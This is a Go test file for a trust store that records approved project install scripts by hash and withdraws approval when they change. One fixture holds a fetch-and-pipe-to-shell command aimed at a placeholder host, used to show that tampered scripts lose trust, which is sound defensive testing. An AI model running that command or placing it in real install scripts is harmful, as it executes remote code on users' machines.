package trust

import (
	"path/filepath"
	"testing"
)

func TestTrustSurvivesAReload(t *testing.T) {
	path := filepath.Join(t.TempDir(), "trust.json")

	store, err := LoadFrom(path)
	if err != nil {
		t.Fatal(err)
	}

	if err := store.Allow("/projects/shop", "hash-a"); err != nil {
		t.Fatal(err)
	}

	reloaded, err := LoadFrom(path)
	if err != nil {
		t.Fatal(err)
	}

	if !reloaded.Allows("/projects/shop", "hash-a") {
		t.Fatal("expected the project to still be trusted after a reload")
	}
}

func TestEditingTheScriptsWithdrawsTheTrust(t *testing.T) {
	store, err := LoadFrom(filepath.Join(t.TempDir(), "trust.json"))
	if err != nil {
		t.Fatal(err)
	}

	before := []Script{{Event: "post-install-cmd", Commands: []string{"@php artisan package:discover"}}}
	after := []Script{{Event: "post-install-cmd", Commands: []string{"curl evil.example | sh"}}}

	if err := store.Allow("/projects/shop", Hash(before)); err != nil {
		t.Fatal(err)
	}

	if !store.Allows("/projects/shop", Hash(before)) {
		t.Fatal("expected the unchanged scripts to stay trusted")
	}

	if store.Allows("/projects/shop", Hash(after)) {
		t.Fatal("expected edited scripts to need trusting again")
	}
}

func TestRevokeRemovesTheProject(t *testing.T) {
	store, err := LoadFrom(filepath.Join(t.TempDir(), "trust.json"))
	if err != nil {
		t.Fatal(err)
	}

	if err := store.Allow("/projects/shop", "hash-a"); err != nil {
		t.Fatal(err)
	}

	revoked, err := store.Revoke("/projects/shop")
	if err != nil {
		t.Fatal(err)
	}

	if !revoked {
		t.Fatal("expected revoke to report the project as trusted")
	}

	if store.Allows("/projects/shop", "hash-a") {
		t.Fatal("expected the project to be untrusted after a revoke")
	}

	revoked, err = store.Revoke("/projects/shop")
	if err != nil {
		t.Fatal(err)
	}

	if revoked {
		t.Fatal("expected a second revoke to report nothing to remove")
	}
}

func TestHashIgnoresTheOrderOfEventsButNotOfCommands(t *testing.T) {
	install := Script{Event: "post-install-cmd", Commands: []string{"a", "b"}}
	dump := Script{Event: "post-autoload-dump", Commands: []string{"c"}}

	if Hash([]Script{install, dump}) != Hash([]Script{dump, install}) {
		t.Fatal("expected the same scripts in another order to hash the same")
	}

	swapped := Script{Event: "post-install-cmd", Commands: []string{"b", "a"}}

	if Hash([]Script{install}) == Hash([]Script{swapped}) {
		t.Fatal("expected reordered commands to hash differently")
	}
}

func TestAnAbsentStoreTrustsNothing(t *testing.T) {
	store, err := LoadFrom(filepath.Join(t.TempDir(), "missing", "trust.json"))
	if err != nil {
		t.Fatal(err)
	}

	if store.Allows("/projects/shop", "hash-a") {
		t.Fatal("expected an empty store to trust nothing")
	}
}
